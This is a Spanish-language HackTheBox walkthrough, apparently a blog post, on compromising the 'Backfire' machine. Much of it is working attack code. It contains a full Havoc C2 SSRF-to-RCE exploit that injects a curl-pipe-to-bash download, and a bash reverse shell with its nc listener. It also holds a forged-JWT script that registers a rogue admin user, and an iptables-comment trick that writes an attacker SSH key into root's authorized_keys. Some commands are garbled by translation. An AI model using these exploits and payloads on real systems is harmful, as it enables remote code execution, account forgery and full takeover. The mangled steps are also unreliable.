---
title: "HTB - Backfiere"
date: 2025-02-24T15:34:30-04:00
categories:
  - HackTheBox
tags:
  - pentesting
---


<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HTB - Backfiere</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #ffffff;
            margin: 20px;
            padding: 20px;
        }
        h1 {
            color: #4CAF50;
        }
        pre {
            background: #1e1e1e;
            padding: 10px;
            border-radius: 5px;
            overflow-x: auto;
        }
        img {
            max-width: 100%;
            border-radius: 5px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

<h1>Acompáñame a explotar BackFiere</h1>

<!-- Espacio para la foto -->
<img src="ruta_de_la_imagen.jpg" alt="BackFiere" />

<p>Lo primero que debemos hacer es la fase de reconocimiento con Nmap.</p>
<img src="https://github.com/xKoutax/xkoutax/blob/master/assets/images/Captura%20de%20pantalla%202025-02-24%20205608.png?raw=true" alt="Captura de pantalla">
<p>Luego del reconocimiento, podemos notar que hay 3 puertos disponibles, pero el que me llama la atención es el puerto 8000.</p>
--------------------------------------------------------------------------------------------------------------------------------
<p>Como lo pensé, había una página alojada. Lo que me da curiosidad es que, como podemos ver, hay 2 archivos, los cuales procederé a descargar.</p>
--------------------------------------------------------------------------------------------------------------------------------
<p>Estos archivos me dan información valiosa:</p>
--------------------------------------------------------------------------------------------------------------------------------
<pre><code>
havoc.yaotl

Teamserver {
    Host = "127.0.0.1"
    Port = 40056

    Build {
        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "ilya" {
        Password = "CobaltStr1keSuckz!"
    }

    user "sergej" {
        Password = "1w4nt2sw1tch2h4rdh4tc2"
    }
}

Demon {
    Sleep = 2
    Jitter = 15

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}

Listeners {
    Http {
        Name = "Demon Listener"
        Hosts = [
            "backfire.htb"
        ]
        HostBind = "127.0.0.1" 
        PortBind = 8443
        PortConn = 8443
        HostRotation = "round-robin"
        Secure = true
    }
}
</code></pre>

<pre><code>
disable_tls.patch

Disable TLS for WebSocket management port 40056, so I can prove that
sergej is not doing any work.
Management port only allows local connections (we use SSH forwarding) so 
this will not compromise our teamserver.

diff --git a/client/src/Havoc/Connector.cc b/client/src/Havoc/Connector.cc
index abdf1b5..6be76fb 100644
--- a/client/src/Havoc/Connector.cc
+++ b/client/src/Havoc/Connector.cc
@@ -8,12 +8,11 @@ Connector::Connector( Util::ConnectionInfo* ConnectionInfo )
 {
     Teamserver   = ConnectionInfo;
     Socket       = new QWebSocket();
-    auto Server  = "wss://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
+    auto Server  = "ws://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
     auto SslConf = Socket->sslConfiguration();

     /* ignore annoying SSL errors */
     SslConf.setPeerVerifyMode( QSslSocket::VerifyNone );
-    Socket->setSslConfiguration( SslConf );
     Socket->ignoreSslErrors();

     QObject::connect( Socket, &QWebSocket::binaryMessageReceived, this, [&]( const QByteArray& Message )

diff --git a/teamserver/cmd/server/teamserver.go b/teamserver/cmd/server/teamserver.go
index 9d1c21f..59d350d 100644
--- a/teamserver/cmd/server/teamserver.go
+++ b/teamserver/cmd/server/teamserver.go
@@ -151,7 +151,7 @@ func (t *Teamserver) Start() {
    }

    // start the teamserver
-   if err = t.Server.Engine.RunTLS(Host+":"+Port, certPath, keyPath); err != nil {
+   if err = t.Server.Engine.Run(Host+":"+Port); err != nil {
      logger.Error("Failed to start websocket: " + err.Error())
    }
</code></pre>
<p>Busque cuidadosamente el CVE de Havoc disponible en todos los navegadores que puedan soportar nuestro procedimiento..</p>
<p>Podemos encontrar que el creador de la máquina Chebuya también tenía un repositorio en el exploit Havoc. Al ejecutar el archivo del exploit, verá que la conexión está cerrada..</p>
<p>También podemos encontrar otro repositorio sobre la vulnerabilidad Havoc..</p>
<pre><code>
c2-vulnerabilities/havoc_auth_rce en la página principal · IncludeSecurity/c2-vulnerabilities
Pruebas de concepto de RCE contra servidores C2 de código abierto. Contribuya al desarrollo de IncludeSecurity/c2-vulnerabilities creando...
github.com
</code></pre>
<p>El repositorio de Github mencionado anteriormente es el correcto para explotar la máquina. Y otro dato interesante es que es el repositorio del creador de la máquina..</p>
<p>Antes de continuar con el archivo, si intentamos ejecutar el exploit SSRF en la máquina, no funcionará. Por lo tanto, necesitamos tener tanto SSRF como RCE para explotar la máquina..</p>
<pre><code> 
GitHub - rishal865/SSRF-TO-RCE: DE SSRF A RCE
SSRF TO RCE. Contribuya al desarrollo de rishal865/SSRF-TO-RCE creando una cuenta en GitHub.
github.com
</code></pre>

<p>En el repositorio anterior, podemos encontrar el código SSRF-to-RCE. Copie el código y guárdelo como RCE.py y cambie la IP a la IP de su VPN HTB..</p>  
<p>Quedaria algoa haci.</p>  


<pre><code>
  rce.py


  import os
import json
import hashlib
import binascii
import random
import requests
import argparse
import urllib3
from Crypto.Cipher import AES
from Crypto.Util import Counter

urllib3.disable_warnings()

key_bytes = 32

def decrypt(key, iv, ciphertext):
    if len(key) <= key_bytes:
        for _ in range(len(key), key_bytes):
            key += b"0"

    assert len(key) == key_bytes

    iv_int = int(binascii.hexlify(iv), 16)
    ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
    aes = AES.new(key, AES.MODE_CTR, counter=ctr)

    plaintext = aes.decrypt(ciphertext)
    return plaintext


def int_to_bytes(value, length=4, byteorder="big"):
    return value.to_bytes(length, byteorder)


def encrypt(key, iv, plaintext):
    if len(key) <= key_bytes:
        for x in range(len(key), key_bytes):
            key = key + b"0"

        assert len(key) == key_bytes

        iv_int = int(binascii.hexlify(iv), 16)
        ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
        aes = AES.new(key, AES.MODE_CTR, counter=ctr)

        ciphertext = aes.encrypt(plaintext)
        return ciphertext

def register_agent(hostname, username, domain_name, internal_ip, process_name, process_id):
    command = b"\x00\x00\x00\x63"
    request_id = b"\x00\x00\x00\x01"
    demon_id = agent_id

    hostname_length = int_to_bytes(len(hostname))
    username_length = int_to_bytes(len(username))
    domain_name_length = int_to_bytes(len(domain_name))
    internal_ip_length = int_to_bytes(len(internal_ip))
    process_name_length = int_to_bytes(len(process_name) - 6)

    data = b"\xab" * 100

    header_data = command + request_id + AES_Key + AES_IV + demon_id + hostname_length + hostname + username_length + username + domain_name_length + domain_name + internal_ip_length + internal_ip + process_name_length + process_name + process_id + data

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    print(agent_header + header_data)
    print("[***] Trying to register agent...")
    r = requests.post(teamserver_listener_url, data=agent_header + header_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to register agent - {r.status_code} {r.text}")


def open_socket(socket_id, target_address, target_port):
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x02"
    subcommand = b"\x00\x00\x00\x10"
    sub_request_id = b"\x00\x00\x00\x03"
    local_addr = b"\x22\x22\x22\x22"
    local_port = b"\x33\x33\x33\x33"

    forward_addr = b""
    for octet in target_address.split(".")[::-1]:
        forward_addr += int_to_bytes(int(octet), length=1)

    forward_port = int_to_bytes(target_port)

    package = subcommand + socket_id + local_addr + local_port + forward_addr + forward_port
    package_size = int_to_bytes(len(package) + 4)

    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data

    print("[***] Trying to open socket on the teamserver...")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to open socket on teamserver - {r.status_code} {r.text}")


def write_socket(socket_id, data):
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x08"
    subcommand = b"\x00\x00\x00\x11"
    sub_request_id = b"\x00\x00\x00\xa1"
    socket_type = b"\x00\x00\x00\x03"
    success = b"\x00\x00\x00\x01"

    data_length = int_to_bytes(len(data))

    package = subcommand + socket_id + socket_type + success + data_length + data
    package_size = int_to_bytes(len(package) + 4)

    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    post_data = agent_header + header_data
    print(post_data)
    print("[***] Trying to write to the socket")
    r = requests.post(teamserver_listener_url, data=post_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to write data to the socket - {r.status_code} {r.text}")


def read_socket(socket_id):
    command = b"\x00\x00\x00\x01"
    request_id = b"\x00\x00\x00\x09"

    header_data = command + request_id

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data

    print("[***] Trying to poll teamserver for socket output...")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Read socket output successfully!")
    else:
        print(f"[!!!] Failed to read socket output - {r.status_code} {r.text}")
        return ""

    command_id = int.from_bytes(r.content[0:4], "little")
    request_id = int.from_bytes(r.content[4:8], "little")
    package_size = int.from_bytes(r.content[8:12], "little")
    enc_package = r.content[12:]

    return decrypt(AES_Key, AES_IV, enc_package)[12:]


def create_websocket_request(host, port):
    request = (
        f"GET /havoc/ HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: 5NUvQyzkv9bpu376gKd2Lg==\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"\r\n"
    ).encode()
    return request


def build_websocket_frame(payload):
    payload_bytes = payload.encode("utf-8")
    frame = bytearray()
    frame.append(0x81)
    payload_length = len(payload_bytes)
    if payload_length <= 125:
        frame.append(0x80 | payload_length)
    elif payload_length <= 65535:
        frame.append(0x80 | 126)
        frame.extend(payload_length.to_bytes(2, byteorder="big"))
    else:
        frame.append(0x80 | 127)
        frame.extend(payload_length.to_bytes(8, byteorder="big"))

    masking_key = os.urandom(4)
    frame.extend(masking_key)
    masked_payload = bytearray(byte ^ masking_key[i % 4] for i, byte in enumerate(payload_bytes))
    frame.extend(masked_payload)

    return frame


parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="The listener target in URL format", required=True)
parser.add_argument("-i", "--ip", help="The IP to open the socket with", required=True)
parser.add_argument("-p", "--port", help="The port to open the socket with", required=True)
parser.add_argument("-A", "--user-agent", help="The User-Agent for the spoofed agent", default="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
parser.add_argument("-H", "--hostname", help="The hostname for the spoofed agent", default="DESKTOP-7F61JT1")
parser.add_argument("-u", "--username", help="The username for the spoofed agent", default="Administrator")
parser.add_argument("-d", "--domain-name", help="The domain name for the spoofed agent", default="ECORP")
parser.add_argument("-n", "--process-name", help="The process name for the spoofed agent", default="msedge.exe")
parser.add_argument("-ip", "--internal-ip", help="The internal ip for the spoofed agent", default="10.1.33.7")

args = parser.parse_args()

magic = b"\xde\xad\xbe\xef"
teamserver_listener_url = args.target
headers = {
    "User-Agent": args.user_agent
}
agent_id = int_to_bytes(random.randint(100000, 1000000))
AES_Key = b"\x00" * 32
AES_IV = b"\x00" * 16
hostname = bytes(args.hostname, encoding="utf-8")
username = bytes(args.username, encoding="utf-8")
domain_name = bytes(args.domain_name, encoding="utf-8")
internal_ip = bytes(args.internal_ip, encoding="utf-8")
process_name = args.process_name.encode("utf-16le")
process_id = int_to_bytes(random.randint(1000, 5000))

register_agent(hostname, username, domain_name, internal_ip, process_name, process_id)

socket_id = b"\x11\x11\x11\x11"
open_socket(socket_id, args.ip, int(args.port))

USER = "ilya"
PASSWORD = "CobaltStr1keSuckz!"
host = "127.0.0.1"
port = 40056
websocket_request = create_websocket_request(host, port)
write_socket(socket_id, websocket_request)
response = read_socket(socket_id)
payload = {"Body": {"Info": {"Password": hashlib.sha3_256(PASSWORD.encode()).hexdigest(), "User": USER}, "SubEvent": 3}, "Head": {"Event": 1, "OneTime": "", "Time": "18:40:17", "User": USER}}
payload_json = json.dumps(payload)
frame = build_websocket_frame(payload_json)
write_socket(socket_id, frame)
response = read_socket(socket_id)

payload = {"Body":{"Info":{"Headers":"","HostBind":"0.0.0.0","HostHeader":"","HostRotation":"round-robin","Hosts":"0.0.0.0","Name":"abc","PortBind":"443","PortConn":"443","Protocol":"Https","Proxy Enabled":"false","Secure":"true","Status":"online","Uris":"","UserAgent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"},"SubEvent":1},"Head":{"Event":2,"OneTime":"","Time":"08:39:18","User": USER}}
payload_json = json.dumps(payload)
frame = build_websocket_frame(payload_json)
write_socket(socket_id, frame)
response = read_socket(socket_id)

cmd = "curl http://10.10.x.x:8000/payload.sh | bash" 
injection = """ \\\\\\\" -mbla; """ + cmd + """ 1>&2 && false #"""
payload = {"Body": {"Info": {"AgentType": "Demon", "Arch": "x64", "Config": "{\n    \"Amsi/Etw Patch\": \"None\",\n    \"Indirect Syscall\": false,\n    \"Injection\": {\n        \"Alloc\": \"Native/Syscall\",\n        \"Execute\": \"Native/Syscall\",\n        \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n        \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n    },\n    \"Jitter\": \"0\",\n    \"Proxy Loading\": \"None (LdrLoadDll)\",\n    \"Service Name\":\"" + injection + "\",\n    \"Sleep\": \"2\",\n    \"Sleep Jmp Gadget\": \"None\",\n    \"Sleep Technique\": \"WaitForSingleObjectEx\",\n    \"Stack Duplication\": false\n}\n", "Format": "Windows Service Exe", "Listener": "abc"}, "SubEvent": 2}, "Head": {
"Event": 5, "OneTime": "true", "Time": "18:39:04", "User": USER}}
payload_json = json.dumps(payload)
frame = build_websocket_frame(payload_json)
write_socket(socket_id, frame)
response = read_socket(socket_id)

</code></pre>

<h1>User</h1>
<p>Siga el mismo procedimiento a continuación..</p>  
<p>Prepare el shell inverso -> bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1. Guárdelo como payload.py.</p>  
<p>Ejecute el servidor HTTP de Python -> python3 -m http.server 8000..</p>  
<p>Ejecute el oyente -> nc -nlvp 4444..</p> 
<p>Ejecute el archivo de explotación desde el repositorio -> python3 RCE.py — destino https://10.10.x.x -i 127.0.0.1 -p 40056.</p> 
<p>Cuando la sesión queda atrapada en el lado del oyente, podemos ver que hemos ingresado exitosamente al puerto ssh del usuario ilya. .</p> 


<h1>Bandera ROOT</h1>
<p>El shell SSH de ilya actual se cerrará repetidamente después de unos minutos..</p> 
<p> Este problema se puede resolver agregando nuestra clave pública SSH al puerto SSH de Ilya, lo que nos permitirá usar el puerto SSH de Ilya en nuestro sistema</p> 

<pre><code>
ssh-keygen
</code></pre>

<p>Complete los datos necesarios y se le proporcionará la clave pública ssh con extensión .pub. Copie la clave pública completa..</p> 
<p>Utilice el siguiente comando para configurarlo como clave autorizada. Ejecute el siguiente comando en el shell de escucha existente para encontrar la bandera del usuario.</p> 

<pre><code>
  echo "TU PUB KEY" | tee -a ~/.ssh/authorized_keys
</code></pre>

<p>Después de la ejecución exitosa, abra una nueva terminal para abrir el puerto SSH del usuario ilya. El uso será en el puerto SSH de ilya..</p> 
<p>Puedes encontrar un archivo txt que contiene información sobre el otro usuario “Sergej”..</p> 
-----------
<p>Podemos usar netstat para encontrar los puertos de escucha y de actividad en la máquina. Podemos encontrar los puertos 5000 y 7096 que son interesantes..</p> 

---------------------------------------------------
<p>Salga de la terminal actual. En el siguiente paso, utilizaremos el método Port Forwarding. Ejecute el siguiente comando en una nueva terminal..</p>
<pre><code>
ssh -i id_rsa ilya@10.10.x.x -L 7096:127.0.0.1:7096 -L 5000:127.0.0.1:5000
</code></pre>

<h1>Abra el navegador y navegue hasta https://127.0.0.1:7096</h1>
---------------------------------------------------------------------
<p>Con la ayuda de chat gpt se ha realizado un scripts que nos ayudara a explotar esta pagina.</p>
<pre><code>
script.py
import jwt
import datetime
import uuid
import requests

rhost = '127.0.0.1:5000'

# Craft Admin JWT
secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
issuer = "hardhatc2.com"
now = datetime.datetime.utcnow()

expiration = now + datetime.timedelta(days=28)
payload = {
"sub": "HardHat_Admin",
"jti": str(uuid.uuid4()),
"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
"iss": issuer,
"aud": issuer,
"iat": int(now.timestamp()),
"exp": int(expiration.timestamp()),
"http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"
}

token = jwt.encode(payload, secret, algorithm="HS256")
print("Generated JWT:")
print(token)

# Use Admin JWT to create a new user 'sth_pentest' as TeamLead
burp0_url = f"https://{rhost}/Login/Register"
burp0_headers = {
"Authorization": f"Bearer {token}",
"Content-Type": "application/json"
}
burp0_json = {
"password": "pfapostol1",
"role": "TeamLead",
"username": "pfapostol1"
}
r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
print(r.text)
</code></pre>
<p>Ingrese las credenciales a continuación
. Nombre de usuario: pfapostol1
. Contraseña: pfapostol1 </p>
<p>Ahora podrás iniciar sesión en el sitio web.</p>
------------------------------------------------------------------
<p>Navega hasta la opción de terminal y ejecuta sergej, luego ejecuta la misma shell que usamos antes y con esto tendremos acceso</p>
-----------------------------------------------------------------------------------------------------------------------------------------------------
<p>Para manetener una concexion establa podemos hacer lo mismo que hicimos anteriormente, creamos una key publica y le damos autorizacion</p>
------------------------------------------------------------------------------------------------------------------------------------------------------
<p>Busque los privilegios que tiene la función sudo habilitada. Podemos ver que iptables habilita la función sudo</p>
<p>Podemos simplemente agregar nuestra clave pública SSH al comentario de la regla de iptables y luego reenviar la regla, incluido el comentario “malicioso”, al archivo authorized_keys.</p>
<p>Siga los pasos a continuación</p>
<p>Ejecute el siguiente comando y agregue su clave pública ssh.</p>
<pre><code>
sudo /usr/sbin/iptables -A INPUT -i lo -m comment --comment $'\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDb8iqOLah7g3WFUrTDmni9t6dXVX+cDWqi+RLpuBplK kali@kali\n' -j ACCEPT
</code></pre>
<p>Guardar en las claves autorizadas</p>
<pre><code>
sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
</code></pre>
<p>Verifique en iptables si el comando anterior se ejecutó correctamente o no</p>
<pre><code>
sudo iptables -S
</code></pre>
<p>A continuación, podemos acceder a la raíz de la máquina. Abrimos una nueva terminal y ejecutamos el código siguiente.</p>
<pre><code>
ssh - clave raíz @backfire .htb
</code></pre>
<p></p>
</body>
</html>
